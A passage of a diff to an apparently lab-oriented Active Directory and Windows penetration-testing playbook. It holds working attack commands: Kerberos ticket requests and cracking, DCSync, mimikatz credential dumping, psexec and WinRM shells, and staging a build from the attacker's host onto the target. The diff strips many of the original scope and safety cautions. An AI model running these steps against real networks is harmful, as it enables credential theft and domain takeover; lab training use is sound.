-- credential_candidate: Validate the recovered account once on one relevant host. Next: AD-03.
-- no_result: Manual useful-file inspection remains available. Next: AD-04.
-- read_or_tool_error: Do not interpret failed collection as absent credentials. Next: PAUSE-COVERAGE.
-- no_result_shares_already_reviewed: GPP returned no result and the same NETLOGON/SYSVOL paths were already inspected without a distinct lead. Continue the current identity's user/computer inventory; do not reopen unchanged shares. Next: AD-05.
-
-If Get-GPPPassword finds nothing, first ask whether **AD-04** already inspected
-the relevant NETLOGON/SYSVOL paths under this identity. If not, use the existing
-`no_result` route to AD-04 for one useful-file question. If the same paths were
-already reviewed and no new file or policy changed, record
-`no_result_shares_already_reviewed` and continue at **AD-05**. An empty scripts
-directory and ordinary policy structure do not prove every credential absent.
+| Result | Next |
+| --- | --- |
+| Credential candidate | **AD-03**. |
+| No result | **AD-04** for a manual look, then **AD-05**. |
+| Tool error | **PAUSE-COVERAGE**. |
 
 ## AD-07. Request one eligible Kerberos material set
 
-Enter with an exact domain/controller and either a known user list for AS-REP
-or a validated domain credential for service-ticket material. Choose the one
-question supported by the current evidence; these are alternatives, not a
-routine pair. Create a fresh private directory for this run. `mkdir` refuses
-an existing directory, so do not add `-p`:
+Enter when: you have a user list for AS-REP, or a valid credential for service tickets.
 
 ```bash
-mkdir -m 700 './ad07-<unique-run-id>'
-```
-
-Known-user AS-REP question:
-
-```bash
-impacket-GetNPUsers '<DOMAIN>/' -usersfile '<USER_FILE>' -dc-ip '<TARGET_IP>' -request -outputfile './ad07-<same-run-id>/asrep.hashes'
-```
-
-Authenticated service-ticket question, choose plaintext or NT hash:
-
-```bash
-impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' -dc-ip '<TARGET_IP>' -request -outputfile './ad07-<same-run-id>/kerberoast.hashes'
-```
-
-```bash
-impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' -hashes ':<NTLM_HASH>' -dc-ip '<TARGET_IP>' -request -outputfile './ad07-<same-run-id>/kerberoast.hashes'
+impacket-GetNPUsers '<DOMAIN>/' -usersfile '<USER_FILE>' -dc-ip '<TARGET_IP>' -request -outputfile asrep.hashes
+impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' -dc-ip '<TARGET_IP>' -request -outputfile kerberoast.hashes
 ```
 
 | Result | Next |
 | --- | --- |
-| New nonempty file contains the requested format | **AD-08** with that exact private file and matching mode. A request alone is not captured material. |
-| No eligible known account or SPN | **AD-09** for a specific relationship question; do not invent usernames. |
-| File is empty, partial or request failed | **PAUSE-COVERAGE** with exact account/domain/time/error context; do not call the directory clear. |
-| Directory or output name already exists | Stop and choose a genuinely new private run directory; do not replace prior material. |
-
-Keep the file private. the source step's cleanup tracks the exact local directory when its
-evidence purpose ends. Do not test every returned account's password.
+| New nonempty hash file | **AD-08**. |
+| No eligible account | **AD-09**. |
+| Empty or failed | **PAUSE-COVERAGE**. |
 
 ## AD-08. Test one captured Kerberos format offline
 
-Enter with a nonempty private file from **AD-07** and its observed format.
-Choose only the matching mode. For `$krb5asrep$23$` material:
-
 ```bash
-hashcat -m 18200 '<EXACT_PRIVATE_ASREP_PATH>' /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 'asrep.hash' /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 'kerberoast.hash' /usr/share/wordlists/rockyou.txt
 ```
 
-For `$krb5tgs$23$` service-ticket material:
-
-```bash
-hashcat -m 13100 '<EXACT_PRIVATE_SERVICE_TICKET_PATH>' /usr/share/wordlists/rockyou.txt
-```
+Use the mode that matches the `$krb5asrep$23$` or `$krb5tgs$23$` prefix.
 
 | Result | Next |
 | --- | --- |
-| One plaintext candidate recovered | **AD-03** for one justified host/account validation; a local crack is not service authentication. |
-| Wordlist exhausted without a match | Record only this wordlist's result; **AD-09** for another evidenced relationship. Do not call the password strong or impossible to recover. |
-| Format, mode, wordlist or tool fails | **PAUSE-COVERAGE** with the exact local error. Do not relabel a failed run as exhausted. |
-
-Do not use these mode numbers for a different Kerberos enctype. Keep captured
-material and any recovered plaintext in private adventure custody.
+| Plaintext recovered | **AD-03** on one justified host. |
+| Wordlist exhausted | **AD-09**. |
+| Tool error | **PAUSE-COVERAGE**. |
 
 ## AD-09. Collect one graph for the authenticated principal
 
-Enter with one validated domain principal and assigned controller. Choose the
-matching credential form for one BloodHound CE collection:
-
-```bash
+```text
 nxc ldap <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --bloodhound --collection All
 ```
 
-```bash
-nxc ldap <TARGET_IP> -d <DOMAIN> -u <USERNAME> -H '<NTLM_HASH>' --bloodhound --collection All
-```
-
-Import the generated ZIP privately. Mark only the principal whose
-authentication succeeded as Owned. A graph edge is a candidate until its
-source, every membership edge, target object and right match this context.
-For a group-mediated gMSA path, preserve the full `Owned user -> MemberOf ->
-group -> ReadGMSAPassword -> gMSA` chain. A right shown on the group alone does
-not establish that the current user has it.
-
-If that membership is missing or stale in the graph, query only the owned
-account. A denied or empty response leaves the membership unverified:
-
-```bash
-ldapsearch -x -H 'ldap://<DC_HOST>' -D '<USERNAME>@<DOMAIN>' -W -b '<BASE_DN>' '(sAMAccountName=<USERNAME>)' memberOf
-```
-
-If controller discovery fails, first confirm that the assigned controller
-still resolves and answers the domain's locator record:
-
-```bash
-getent hosts '<DC_HOST>'
-nslookup -type=SRV '_ldap._tcp.dc._msdcs.<DOMAIN>' <TARGET_IP>
-```
-
-If the controller and identity still match, retry the same collection once
-with explicit controller DNS. Choose the same credential form as above:
-
-```bash
-nxc ldap <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --dns-server <TARGET_IP> --bloodhound --collection All
-```
-
-```bash
-nxc ldap <TARGET_IP> -d <DOMAIN> -u <USERNAME> -H '<NTLM_HASH>' --dns-server <TARGET_IP> --bloodhound --collection All
-```
+Mark only the successfully authenticated principal as Owned. An edge is a candidate until source, membership, target and right all match.
 
 | Result | Next |
 | --- | --- |
-| Exact LAPS, replication, RBCD, gMSA, GPO or object right with verified source and target | **AD-10**, **AD-11**, **AD-16**, **AD-17**, **AD-18** or **AD-19**, respectively, for its own prerequisites. |
-| Exact local-admin or WinRM relationship on an assigned host | **AD-13** or **AD-12** for that host; the graph alone is not a login. |
-| No verified edge, but another observed service lead remains | **NET-05**. Do not infer privilege from a shortest-path suggestion. |
-| Collection failed, was partial, or repeated controller lookup failed | **PAUSE-COVERAGE**; missing edges are not absent rights. |
-
-Keep the ZIP and any queried membership evidence private. the source step's cleanup tracks
-the exact local archive when it is no longer needed.
+| LAPS / replication / RBCD / gMSA / GPO / object right | **AD-10** / **AD-11** / **AD-16** / **AD-17** / **AD-18** / **AD-19**. |
+| Local admin or WinRM edge | **AD-13** / **AD-12**. |
+| No edge, other service lead | **NET-05**. |
+| Partial collection | **PAUSE-COVERAGE**. |
 
 ## AD-10. Read one permitted LAPS account and test its exact scope
 
-Enter with a verified read right on one named computer. Query only that
-computer using the current owned identity:
-
 ```bash
 impacket-GetLAPSPassword '<DOMAIN>/<USERNAME>' -computer '<TARGET_HOST>' -dc-ip '<DC_IP>'
-```
-
-If the tool cannot identify the managed account or a legacy-LAPS field is the
-specific question, read that one computer's directory record instead:
-
-```bash
-ldapsearch -x -H 'ldap://<DC_IP>' -D '<USERNAME>@<DOMAIN>' -W -b '<BASE_DN>' '(&(objectClass=computer)(sAMAccountName=<TARGET_COMPUTER>$))' sAMAccountName dNSHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
-```
-
-Tie the returned value to its exact computer and managed account. For a member
-host with an evidenced local managed account, validate it there once:
-
-```bash
 nxc smb <TARGET_HOST> --local-auth -u <LOCAL_USERNAME> -p '<PASSWORD>'
 ```
 
-Only if the assigned host is a verified controller and the returned account is
-actually domain-scoped, use domain authentication instead:
-
-```bash
-nxc smb <TARGET_HOST> -d <DOMAIN> -u <MANAGED_ACCOUNT> -p '<PASSWORD>'
-```
+Use domain auth only if the returned account is domain-scoped on a controller.
 
 | Result | Next |
 | --- | --- |
-| Same-host `(Pwn3d!)` indication | **AD-13** for one matching shell attempt; still verify host and token at **WIN-01**. |
-| Authentication succeeds without admin indication | Record only that service login; **AD-12** if WinRM on this exact host is an observed, permitted question. |
-| Read denied, empty or account/computer scope differs | **AD-09** for the exact right and computer, or **PAUSE-COVERAGE** for an unresolved read. Do not test the value across hosts. |
-
-Keep the secret private. A readable LAPS value is not an owned shell.
+| `Pwn3d!` on the same host | **AD-13**. |
+| Login works, no admin | **AD-12** if WinRM is observed. |
+| Denied or wrong scope | **AD-09**. |
 
 ## AD-11 DCSync one account only with replication rights
-
-Shell: Kali
-
-Enter when: The owned principal has both required replication rights on the domain.
-
-Question: Was material returned for the one justified account?
-
-Run only when the owned principal has both directory replication rights on the domain. Request the one account needed for the current path.
 
 ```text
 impacket-secretsdump '<DOMAIN>/<USERNAME>@<DC_HOST>' -dc-ip '<TARGET_IP>' -just-dc-user '<TARGET_USER>'
 ```
 
-A returned hash is credential material, not an interactive session. Store it in protected lab notes and validate only against the exact next host or service. Access denied means the relationship or context was wrong.
-
-- account_material_returned: Keep it as protected candidate material and validate only one justified next context. Next: AD-03.
-- access_denied: The relationship or execution context was not sufficient. Next: AD-09.
-- incomplete_or_error: A tool attempt alone establishes no replicated material. Next: PAUSE-COVERAGE.
+| Result | Next |
+| --- | --- |
+| Material returned | **AD-03** on the next justified host. |
+| Access denied | **AD-09**. |
+| Incomplete | **PAUSE-COVERAGE**. |
 
 ## AD-12. Try one permitted WinRM shell on the exact host
 
-Enter with an observed WinRM endpoint, one permitted identity and its exact
-local or domain scope. Choose one matching form. Plaintext is entered at the
-client prompt, not on this command line:
-
-```bash
+```text
 evil-winrm -i '<TARGET_HOST>' -u '<USERNAME>'
-```
-
-```bash
 evil-winrm -i '<TARGET_HOST>' -u '<USERNAME>' -H '<NTLM_HASH>'
 ```
 
-If the shell does not open, make one matching service-specific authentication
-check only when the error does not already explain the denial:
-
-```bash
-nxc winrm <TARGET_HOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>'
-```
-
-```bash
-nxc winrm <TARGET_HOST> -d <DOMAIN> -u <USERNAME> -H '<NTLM_HASH>'
-```
-
-Use the exact local-auth form when the validated account is local; do not turn
-a local credential into a domain attempt. Compare host, username and error
-stage before a retry.
-
 | Result | Next |
 | --- | --- |
-| Usable shell opens | **WIN-01** to verify assigned hostname and current token. |
-| Authentication works but no shell is authorized | Preserve valid authentication and the WinRM denial; **AD-09** or another observed lead. |
-| Authentication is rejected | **AD-03** only if one concrete identity/host context changed. No credential sweep. |
-| Transport, TLS or endpoint error | **PAUSE-ROUTE** with the exact host and error; no credential verdict. |
-
-Close only the session opened by this attempt. A tool login message without a
-usable prompt does not establish a shell.
+| Usable shell | **WIN-01**. |
+| Auth works, no shell | **AD-09**. |
+| Rejected | **AD-03** only if context changed. |
+| Transport error | **PAUSE-ROUTE**. |
 
 ## AD-13. Open one already validated SMB-admin shell
 
-Enter only when the same assigned host and identity already returned a current
-`(Pwn3d!)` admin indication at **AD-03**, **AD-10** or **AD-14**. Do not repeat
-the same SMB authentication merely to enter this step. Choose the matching
-credential form for one shell attempt:
+Enter only when the same host and identity returned `Pwn3d!`.
 
-```bash
+```text
 impacket-psexec '<DOMAIN>/<USERNAME>@<TARGET_HOST>'
-```
-
-```bash
 impacket-psexec -hashes ':<NTLM_HASH>' '<DOMAIN>/<USERNAME>@<TARGET_HOST>'
 ```
 
-For a locally scoped account, use that account's verified same-host context,
-not a domain principal:
-
-```bash
-impacket-psexec -hashes ':<NTLM_HASH>' '<LOCAL_USERNAME>@<TARGET_HOST>'
-```
-
 | Result | Next |
 | --- | --- |
-| Usable shell opens | **WIN-01** to verify assigned hostname and current token. PsExec text alone is not host or privilege proof. |
-| SMB authentication remains valid but remote execution is denied | Preserve the exact service/share error at **PAUSE-COVERAGE**; do not label the credential rejected. |
-| Authentication is rejected or the host/account no longer matches | **AD-03** only after identifying the changed context; do not fan out attempts. |
-
-Record any service/file effect created by the selected PsExec implementation
-and close or recover that exact effect through the source step's cleanup. No second host is
-implied by one admin indication.
+| Usable shell | **WIN-01**. |
+| Auth valid, execution denied | **PAUSE-COVERAGE**. |
+| Rejected | **AD-03**. |
 
 ## AD-14. Collect one member-host secret source after admin proof
 
-Enter only after **AD-13** or an equivalent same-host check verified
-administrative access to one assigned member host. Choose one collection
-context, not both. From Kali with the validated domain account:
+Enter only after AD-13 or equivalent same-host admin proof.
 
-```bash
+```text
 impacket-secretsdump '<DOMAIN>/<USERNAME>@<TARGET_HOST>'
 ```
 
-Or, in an existing verified elevated PowerShell shell on that host, invoke one
-locally reviewed collector:
-
-```powershell
-& '<REVIEWED_MIMIKATZ_PATH>' 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'
-```
-
-Keep returned secrets private and tied to this host, identity and source. If
-one local NT hash is relevant to this same host, validate it once:
-
-```bash
-nxc smb <TARGET_HOST> --local-auth -u <LOCAL_USERNAME> -H '<NTLM_HASH>'
-```
+In an elevated shell instead: `& '<MIMIKATZ>' 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'`.
 
 | Result | Next |
 | --- | --- |
-| Same-host local account returns `(Pwn3d!)` | **AD-13** for one matching shell attempt; do not repeat this login there. |
-| One attributed domain credential is relevant | **AD-03** on one justified host; local material is not automatically domain material. |
-| Exact WinRM service is observed and a matching identity is permitted | **AD-12** for its own login question. |
-| No relevant material or collection failed | Keep the exact extent/error at **WIN-01** or **PAUSE-COVERAGE**; no absence claim from a failed tool. |
-
-Do not dump another host or test every account. the source step's cleanup tracks any local
-collector staged for this attempt; collection output stays in private custody.
+| Local account returns `Pwn3d!` | **AD-13**. |
+| Relevant domain credential | **AD-03** on one host. |
+| WinRM observed with matching identity | **AD-12**. |
+| Nothing useful | **PAUSE-COVERAGE**. |
 
 ## WIN-01. Identify this Windows shell
 
-Enter with a new Windows shell or changed token. In that shell, first answer only
-which host and effective token you actually have:
+Enter when: you have a new Windows shell or changed token.
 
 ```powershell
 hostname
 whoami /all
 ```
 
-Compare the hostname with the assigned target. Read the enabled groups and
-privileges in the current token, not merely the username. If host or shell
-identity cannot be matched, keep the session unverified at **EXP-03**; do not
-claim access to the assigned box. When a specific OS, network or Kerberos
-question affects the next choice, run only the corresponding check:
+Match the hostname to the assigned target and read the actual token, not the username.
 
-```powershell
-systeminfo
-```
-
-```powershell
-ipconfig /all
-```
-
-```powershell
-klist
-```
-
-`/all` is needed for token privileges and adapter/DNS context; the other checks
-need no extra flags. These three context checks are not a seven-command entry
-ritual. A build, ticket or extra interface alone is not a vulnerability, access
-grant or scope expansion.
-
-If this token should read an exact assigned objective file, read it in this
-attributed shell and keep its value privately:
-
-```powershell
-Get-Content -LiteralPath '<EXACT_ASSIGNED_OBJECTIVE_FILE>'
-```
-
-Show the target address here only when the exercise requires it:
-
-```powershell
-ipconfig
-```
-
-| Observed result | Next choice |
+| Result | Next |
 | --- | --- |
-| `system_identity`: assigned host and effective `NT AUTHORITY\SYSTEM` | Read the exact assigned objective here if one applies; keep value, host and token in private evidence. SYSTEM alone is not objective proof. |
-| `restricted_or_standard`: ordinary or restricted token | **WIN-16**, then one justified **WIN-03** or **WIN-02** lead. |
-| `elevated_member_admin`: elevated admin on an evidenced domain member host | **AD-14** only for its separate collection question. A local admin on an unrelated/standalone host does not satisfy that gate. |
-| `domain_relationship`: actual domain context plus the required right | **AD-09** for that confirmed right; otherwise start at **AD-01** or preserve the missing fact. |
-| `enabled_impersonation`: enabled `SeImpersonatePrivilege` in this token | **WIN-08** only after its reviewed prerequisites. |
-| `restore_privilege`: enabled `SeRestorePrivilege` | **WIN-09** only with its RDP and backup/recovery prerequisites. |
-| `known_plaintext_identity`: separately validated alternate plaintext identity | **WIN-10** for one permitted process-switch question. A name or saved target is not enough. |
-| `volume_privilege`: enabled `SeManageVolumePrivilege` | **WIN-11** only on an assigned disposable lab with its recovery gate. |
-| `internal_service`: one confirmed loopback listener | **WIN-12** for that exact service, not for an inferred internal network. |
-| `exact_build_lead`: exact revision and named patch-dependent candidate | **WIN-13** to test prerequisites while retaining ordinary leads. |
-| `context_incomplete`: host, token or prerequisite cannot be established | **PAUSE-COVERAGE**; retain the uncertainty. |
-
-These checks create no target artifact. Close any temporary shell according to
-its owning access task; do not continue privilege enumeration solely because
-the token is SYSTEM.
+| Ordinary or restricted token | **WIN-16**, then **WIN-02** or **WIN-03**. |
+| SYSTEM on the assigned host | Objective proof if one applies; otherwise **WIN-02**. |
+| Elevated admin on a domain member | **AD-14**. |
+| Enabled `SeImpersonatePrivilege` | **WIN-08**. |
+| Enabled `SeRestorePrivilege` / `SeManageVolumePrivilege` | **WIN-09** / **WIN-11**. |
+| Loopback listener | **WIN-12**. |
+| Host or token unverified | **EXP-03**. |
 
 ## WIN-16. Inspect one relevant non-standard Windows path
 
-Enter with a verified Windows foothold. If an exact non-standard path is already observed,
-list that directory directly; do not list the drive root first:
-
 ```powershell
-Get-ChildItem -LiteralPath '<EXACT_OBSERVED_DIRECTORY>' -Force
+Get-ChildItem -LiteralPath '<OBSERVED_DIRECTORY>' -Force
+Get-Content -LiteralPath '<RELEVANT_FILE>' -TotalCount 80
 ```
 
-If no path is known, list `C:\` once and choose one relevant non-standard
-directory. Do not recurse across the drive:
-
-```powershell
-Get-ChildItem -LiteralPath 'C:\' -Force
-```
-
-For one observed operational text file, read a bounded first range. A longer
-file may need another justified range; 80 lines do not prove exhaustion:
-
-```powershell
-Get-Content -LiteralPath '<EXACT_RELEVANT_FILE>' -TotalCount 80
-```
+With no known path, list `C:\` once and pick a non-standard directory.
 
 | Result | Next |
 | --- | --- |
-| Exact service binary or recurring task consumer | **WIN-04** or **WIN-05** for actual account, path permission and trigger. |
-| Exact application/startup consumer | **WIN-06** for its version, path and elevation context. |
-| No relevant path in this bounded view | **WIN-03** for one user-context lead, then **WIN-02** if still needed. |
-| Denied, missing or ambiguous path/read | Preserve the exact failed path and identity at **WIN-02** or **PAUSE-COVERAGE**; do not suppress the error or call the drive empty. |
+| Service or task consumer | **WIN-04** / **WIN-05**. |
+| Application or autorun | **WIN-06**. |
+| Nothing relevant | **WIN-03**, then **WIN-02**. |
+| Denied or ambiguous | **PAUSE-COVERAGE**. |
 
 ## WIN-02. Choose one Windows lead without overwriting a scan file
 
-Enter with WIN-01's attributed Windows host and current token. Run one reviewed
-local WinPEAS executable **or** the native pass below for this same context.
-Do not run an unreviewed downloaded binary. A scanner result is a lead, not a
-permission, active consumer, executable path or successful privilege change.
-
-If the exact reviewed executable is already present and permitted, inspect its
-local file/hash first. Stop if the file is missing, changed or not the reviewed
-artifact:
+Enter with WIN-01's token. Use one reviewed WinPEAS copy if you have it, otherwise the native checks:
 
 ```powershell
-Get-Item -LiteralPath '<absolute-reviewed-local-WinPEAS-path>' |
-  Select-Object FullName, Length, LastWriteTimeUtc
-Get-FileHash -LiteralPath '<absolute-reviewed-local-WinPEAS-path>' -Algorithm SHA256
-```
-
-Only after comparing that hash with the private approved source, run it **once**
-in the current target PowerShell. It prints to the terminal; this task does not
-create or overwrite `winpeas.txt`. Keep the actual exit and any incomplete output:
-
-```powershell
-& '<same-absolute-reviewed-local-WinPEAS-path>'
-Write-Output "WinPEAS exit: $LASTEXITCODE"
-```
-
-If no reviewed binary is available, or its output is partial, use the following
-read-only native checks once. Run each block separately in the current target
-PowerShell. Keep denied/missing-command errors with the affected part; do not
-label it clean coverage:
-
-```powershell
-Get-CimInstance Win32_Service |
-  Select-Object Name, State, StartName, PathName
-```
-
-```powershell
+Get-CimInstance Win32_Service | Select-Object Name, State, StartName, PathName
 schtasks.exe /query /fo LIST /v
-Write-Output "Task query exit: $LASTEXITCODE"
+Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, User, Location
 ```
 
-```powershell
-Get-CimInstance Win32_StartupCommand |
-  Select-Object Name, Command, User, Location
-```
-
-For **one** observed service/task/application path, check the exact file and
-parent ACL without invoking the consumer. Stop on a missing path or denied ACL:
+For one candidate path, check the file and parent ACL:
 
 ```powershell
-Get-Item -LiteralPath '<absolute-observed-consumed-path>' |
-  Select-Object FullName, Length, LastWriteTimeUtc
-(Get-Acl -LiteralPath '<absolute-observed-consumed-path>').Access |
-  Select-Object IdentityReference, FileSystemRights, AccessControlType, IsInherited
-(Get-Acl -LiteralPath (Split-Path -Parent '<absolute-observed-consumed-path>')).Access |
-  Select-Object IdentityReference, FileSystemRights, AccessControlType, IsInherited
+Get-Item -LiteralPath '<PATH>' | Select-Object FullName, Length, LastWriteTimeUtc
+(Get-Acl -LiteralPath '<PATH>').Access | Select-Object IdentityReference, FileSystemRights, AccessControlType, IsInherited
+(Get-Acl -LiteralPath (Split-Path -Parent '<PATH>')).Access | Select-Object IdentityReference, FileSystemRights, AccessControlType, IsInherited
 ```
 
 | Result | Next |
 | --- | --- |
-| `service_path_lead`: exact service, run-as identity, path and relevant ACL | **WIN-04** to verify active consumer, permission and trigger. No restart/replacement here. |
-| `scheduled_task_lead`: exact task, run-as identity and action | **WIN-05** for action path, permission and actual next run. Do not trigger it here. |
-| `application_lead`: named installed/startup path | **WIN-06** to identify version and elevated consumer. A writable folder alone is not elevation. |
-| `installer_policy_lead`: observed policy clue | **WIN-07** to read both hives. One reported value is not sufficient. |
-| `impersonation_lead`: relevant enabled current-token privilege | **WIN-08** only after its reviewed prerequisites. |
-| `restore_lead`: relevant enabled current-token privilege | **WIN-09** only with the required RDP/backup/recovery context. |
-| `credential_lead`: exact current-user material | **WIN-03** for source and permitted use, not bulk collection or guessing. |
-| `patch_candidate`: named exact build/feature candidate | **WIN-13** for revision, architecture and feature checks. Keep other supported leads queued. |
-| `no_verified_lead`: inspected leads exhausted in this context | **PAUSE-COVERAGE**, then another observed service at **NET-05** or a resumable pause. Do not rerun an unchanged pass. |
-| `scanner_failure`: reviewed scanner and available native checks are denied, incomplete or fail | **PAUSE-COVERAGE** with the exact missing collection field and current identity; failure is not absence. |
-
-Keep only the relevant output and provenance in protected adventure evidence
-in private adventure evidence. These native checks create no target file or listener. A
-reviewed third-party scanner may have its own side effects; follow that
-artifact's reviewed cleanup and the source step's cleanup. Do not delete or overwrite earlier
-scan output, restart a service, trigger a task or silently run this again after
-unchanged results. A changed token goes through the changed-context check first.
+| Service / task / application lead | **WIN-04** / **WIN-05** / **WIN-06**. |
+| AlwaysInstallElevated clue | **WIN-07**. |
+| Token privilege | **WIN-08**, **WIN-09** or **WIN-11**. |
+| Credential material | **WIN-03**. |
+| Build candidate | **WIN-13**. |
+| Nothing | **PAUSE-COVERAGE**, then **NET-05**. |
 
 ## WIN-03. Check one saved identity lead
 
-Enter from **WIN-16** or a specific saved-target/user-file observation with the
-current Windows identity known. These are separate choices, not commands to run
-as a batch. First list Credential Manager target names; `/list` selects the
-inventory operation and does not reveal a password:
-
 ```powershell
 cmdkey.exe /list
-```
-
-If history could answer a named question, look at only the last 30 commands in
-the *current user's* PSReadLine file. This may display secrets in your private
-terminal; do not paste the result into the reusable checklist or a shared log.
-An absent history file is not evidence that no credential exists.
-
-```powershell
 Get-Content (Get-PSReadLineOption).HistorySavePath -Tail 30
-```
-
-If one of the current user's obvious work folders is relevant, list their top
-level only. Missing or denied folders must remain visible as errors:
-
-```powershell
 Get-ChildItem "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads"
 ```
 
-For an observed saved-target file, check its exact path and access before
-reading any contents. `-LiteralPath` prevents wildcard expansion in a file name:
+For an observed saved-target or RDP profile, read named fields only:
 
 ```powershell
-Get-Item -LiteralPath '<absolute-observed-saved-target-or-config-path>' | Select-Object FullName,Length,LastWriteTime
-Get-Acl -LiteralPath '<absolute-observed-saved-target-or-config-path>' | Select-Object Owner,AccessToString
+Get-Item -LiteralPath '<PATH>' | Select-Object FullName,Length,LastWriteTime
+Select-String -LiteralPath '<RDP_PROFILE>' -Pattern '^(full address|gatewayhostname|username|targetname):'
 ```
 
-For an observed RDP profile only, read named non-secret fields. This pattern
-does not display a `password 51` blob; other application formats need their
-own observed field names, not an indiscriminate file dump:
-
-```powershell
-Select-String -LiteralPath '<absolute-observed-rdp-profile-path>' -Pattern '^(full address|gatewayhostname|username|targetname):' |
-  Select-Object LineNumber,Line
-```
-
-| Observed result | Next choice |
+| Result | Next |
 | --- | --- |
-| `domain_credential_candidate`: an actual permitted domain identity/material candidate | **AD-03** for one exact service and identity; do not call it valid before that check. |
-| `validated_plaintext_switch`: alternate plaintext identity already validated in scope | **WIN-10** for the one process-switch question. |
-| `no_relevant_material`: bounded inspection yields no justified lead | **WIN-02**; record which sources were actually readable. |
-| `saved_target_without_secret`: name, RDP metadata or protected blob without usable authorized plaintext | **GAP-ACCESS** for that exact target; choose another observed lead through **PAUSE-COVERAGE**. Do not export or decrypt the blob. |
-| `read_or_context_error`: wrong user, missing/denied file or stale target | **PAUSE-COVERAGE** with the exact failed source and identity; reconcile before retry. |
-
-This check changes no file. Keep any displayed secret and file content in
-private adventure custody; close only a temporary inspection shell you opened.
+| Domain credential candidate | **AD-03**. |
+| Validated plaintext switch | **WIN-10**. |
+| Nothing | **WIN-02**. |
+| Target without secret | **GAP-ACCESS**. |
 
 ## WIN-13. Check one exact Windows build candidate
 
-Enter with one named, reviewed patch-dependent candidate on the assigned
-Windows host. In that shell, record its exact edition, build and update
-revision:
-
 ```powershell
-Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' |
-  Select-Object ProductName,DisplayVersion,CurrentBuildNumber,UBR,InstallationType
+Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object ProductName,DisplayVersion,CurrentBuildNumber,UBR,InstallationType
 ```
-
-Compare those values with the candidate's reviewed affected-build range. If
-architecture or one feature/service is a stated prerequisite, check only that
-missing fact with the matching native command. A missing KB in a general
-hotfix list is not proof that a cumulative fix is absent.
 
 | Result | Next |
 | --- | --- |
-| Exact build and all candidate-specific prerequisites match; ordinary leads were compared | **WIN-14** to review and prepare one pinned artifact. Matching is not exploit proof. |
-| A required build, feature or architecture value mismatches | **WIN-02** for another observed lead; close only this candidate. |
-| Ordinary, less-disruptive lead remains unreviewed | **WIN-02** before selecting an unstable attempt. |
-| Revision, fix or feature state remains uncertain or denied | **PAUSE-COVERAGE** with the exact missing fact; do not treat a missing KB as a vulnerable build. |
+| Build and prerequisites match | **WIN-14**. |
+| Mismatch | **WIN-02**. |
+| Uncertain | **PAUSE-COVERAGE**. |
 
 ## WIN-14. Prepare one reviewed Windows candidate without replacement
 
-Enter after **WIN-13** matches one pinned source candidate. Keep its original
-unchanged in a private Kali working directory. If edits are required, choose a
-new derivative path there. This subshell refuses an existing file or symlink;
-an error or partial copy stops the build:
+Enter after WIN-13 matches. Hash the source before and after any edit, build to a fresh output, then serve only its directory and stage it under a new path with a hash check:
 
 ```bash
-(
-  umask 077
-  set -C
-  if test -e '<NEW_PRIVATE_DERIVATIVE>' || test -L '<NEW_PRIVATE_DERIVATIVE>'; then
-    printf 'Derivative exists; stop\n' >&2
-    exit 2
-  fi
-  cat -- '<PINNED_ORIGINAL_SOURCE>' > '<NEW_PRIVATE_DERIVATIVE>'
-)
+sha256sum -- '<ORIGINAL>' '<DERIVATIVE>'
+python3 -m http.server <PORT> --bind <LHOST> --directory '<BUILD_DIR>'
 ```
-
-Hash the original before and after editing, inspect the exact diff, then use
-the selected source's reviewed build instructions with a fresh output path.
-Do not reuse an old binary just because its filename matches:
-
-```bash
-sha256sum -- '<PINNED_ORIGINAL_SOURCE>' '<NEW_PRIVATE_DERIVATIVE>'
-diff -u -- '<PINNED_ORIGINAL_SOURCE>' '<NEW_PRIVATE_DERIVATIVE>'
-file -- '<NEW_REVIEWED_BUILD_OUTPUT>'
-sha256sum -- '<NEW_REVIEWED_BUILD_OUTPUT>'
-```
-
-Only after the build's architecture and hash match the planned target, serve
-only its private containing directory on the owned Kali lab interface:
-
-```bash
-python3 -m http.server '<UNUSED_LISTENER_PORT>' --bind '<OWNED_KALI_LAB_IP>' --directory '<PRIVATE_DIRECTORY_CONTAINING_ONLY_THE_NEW_BUILD>'
-```
-
-In the Windows target shell,
-choose a fresh private staging directory and absent file path. Stop on an
-existing directory/file, failed download or hash mismatch:
 
 ```powershell
-if (Test-Path -LiteralPath '<NEW_PRIVATE_STAGING_DIRECTORY>') { throw 'Staging directory exists; stop.' }
-New-Item -ItemType Directory -Path '<NEW_PRIVATE_STAGING_DIRECTORY>' -ErrorAction Stop | Out-Null
-if (Test-Path -LiteralPath '<NEW_PRIVATE_STAGING_FILE>') { throw 'Staging file exists; stop.' }
-Invoke-WebRequest 'http://<OWNED_KALI_LAB_IP>:<LISTENER_PORT>/<EXACT_BUILD_FILENAME>' -OutFile '<NEW_PRIVATE_STAGING_FILE>' -ErrorAction Stop
-if ((Get-FileHash -LiteralPath '<NEW_PRIVATE_STAGING_FILE>' -Algorithm SHA256 -ErrorAction Stop).Hash -ne '<RECORDED_BUILD_SHA256>') { throw 'Transferred file hash mismatch; do not execute.' }
+Invoke-WebRequest 'http://<LHOST>:<PORT>/<FILE>' -OutFile '<STAGE>' -ErrorAction Stop
+(Get-FileHash -LiteralPath '<STAGE>' -Algorithm SHA256).Hash
 ```
-
-Stop the exact foreground file server after this one transfer. A private
-staging directory must have no competing writer; the existence checks do not
-make a shared directory atomic. Keep the derivative, build hash and exact
-target path together. A partial or mismatched stage is not executable.
 
 | Result | Next |
 | --- | --- |
-| Reviewed derivative/build and exact staged hash match | **WIN-15** only after its disposable reset and one-attempt gates. |
-| Existing output path or unexpected file/link | Stop; choose a new private path after custody review. Do not delete or overwrite an unknown file. |
